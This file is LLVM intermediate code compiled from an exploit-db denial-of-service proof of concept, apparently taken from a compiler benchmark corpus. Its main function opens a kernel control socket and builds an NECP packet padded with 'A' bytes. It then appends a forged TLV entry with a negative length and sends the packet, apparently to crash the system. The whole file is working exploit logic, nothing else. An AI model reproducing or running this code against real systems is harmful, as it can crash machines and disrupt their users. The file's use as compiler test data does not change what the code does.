; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_39378.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_39378.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.necp_packet_header = type { i32, i64, i64 }

@.str = private unnamed_addr constant [33 x i8] c"failed to get control socket :(\0A\00", align 1
@.str.1 = private unnamed_addr constant [26 x i8] c"got a control socket! %d\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i64, align 8
  %4 = alloca i32*, align 8
  %5 = alloca i32*, align 8
  %6 = alloca %struct.necp_packet_header*, align 8
  %7 = alloca i32*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %10 = call i32 (...) @ctl_open()
  store i32 %10, i32* %2, align 4
  %11 = load i32, i32* %2, align 4
  %12 = icmp slt i32 %11, 0
  br i1 %12, label %13, label %15

13:                                               ; preds = %0
  %14 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str, i64 0, i64 0))
  store i32 1, i32* %1, align 4
  br label %60

15:                                               ; preds = %0
  %16 = load i32, i32* %2, align 4
  %17 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.1, i64 0, i64 0), i32 %16)
  %18 = call i32* @malloc(i32 4096)
  store i32* %18, i32** %4, align 8
  %19 = load i32*, i32** %4, align 8
  %20 = call i32 @memset(i32* %19, i8 signext 0, i32 4096)
  %21 = call i32* @malloc(i32 4096)
  store i32* %21, i32** %5, align 8
  %22 = load i32*, i32** %5, align 8
  %23 = call i32 @memset(i32* %22, i8 signext 65, i32 4096)
  %24 = load i32*, i32** %4, align 8
  %25 = bitcast i32* %24 to %struct.necp_packet_header*
  store %struct.necp_packet_header* %25, %struct.necp_packet_header** %6, align 8
  %26 = load %struct.necp_packet_header*, %struct.necp_packet_header** %6, align 8
  %27 = getelementptr inbounds %struct.necp_packet_header, %struct.necp_packet_header* %26, i32 0, i32 0
  store i32 1, i32* %27, align 8
  %28 = load %struct.necp_packet_header*, %struct.necp_packet_header** %6, align 8
  %29 = getelementptr inbounds %struct.necp_packet_header, %struct.necp_packet_header* %28, i32 0, i32 2
  store i64 0, i64* %29, align 8
  %30 = load %struct.necp_packet_header*, %struct.necp_packet_header** %6, align 8
  %31 = getelementptr inbounds %struct.necp_packet_header, %struct.necp_packet_header* %30, i32 0, i32 1
  store i64 0, i64* %31, align 8
  %32 = load %struct.necp_packet_header*, %struct.necp_packet_header** %6, align 8
  %33 = getelementptr inbounds %struct.necp_packet_header, %struct.necp_packet_header* %32, i64 1
  %34 = bitcast %struct.necp_packet_header* %33 to i32*
  store i32* %34, i32** %7, align 8
  store i32 1094795585, i32* %8, align 4
  %35 = load i32*, i32** %7, align 8
  %36 = call i32* @add_real_tlv(i32* %35, i32 2, i32 4, i32* %8)
  store i32* %36, i32** %7, align 8
  store i32 1, i32* %9, align 4
  %37 = load i32*, i32** %7, align 8
  %38 = call i32* @add_real_tlv(i32* %37, i32 4, i32 1, i32* %9)
  store i32* %38, i32** %7, align 8
  %39 = load i32*, i32** %7, align 8
  %40 = load i32*, i32** %5, align 8
  %41 = call i32* @add_real_tlv(i32* %39, i32 3, i32 1, i32* %40)
  store i32* %41, i32** %7, align 8
  %42 = load i32*, i32** %7, align 8
  %43 = load i32*, i32** %5, align 8
  %44 = call i32* @add_real_tlv(i32* %42, i32 3, i32 1024, i32* %43)
  store i32* %44, i32** %7, align 8
  %45 = load i32*, i32** %7, align 8
  %46 = load i32*, i32** %5, align 8
  %47 = call i32* @add_fake_tlv(i32* %45, i32 3, i32 -1051, i32* %46, i32 16)
  store i32* %47, i32** %7, align 8
  %48 = load i32*, i32** %7, align 8
  %49 = load i32*, i32** %4, align 8
  %50 = ptrtoint i32* %48 to i64
  %51 = ptrtoint i32* %49 to i64
  %52 = sub i64 %50, %51
  %53 = sdiv exact i64 %52, 4
  store i64 %53, i64* %3, align 8
  %54 = load i32, i32* %2, align 4
  %55 = load i32*, i32** %4, align 8
  %56 = load i64, i64* %3, align 8
  %57 = call i32 @send(i32 %54, i32* %55, i64 %56, i32 0)
  %58 = load i32, i32* %2, align 4
  %59 = call i32 @close(i32 %58)
  store i32 0, i32* %1, align 4
  br label %60

60:                                               ; preds = %15, %13
  %61 = load i32, i32* %1, align 4
  ret i32 %61
}

declare dso_local i32 @ctl_open(...) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32* @malloc(i32) #1

declare dso_local i32 @memset(i32*, i8 signext, i32) #1

declare dso_local i32* @add_real_tlv(i32*, i32, i32, i32*) #1

declare dso_local i32* @add_fake_tlv(i32*, i32, i32, i32*, i32) #1

declare dso_local i32 @send(i32, i32*, i64, i32) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
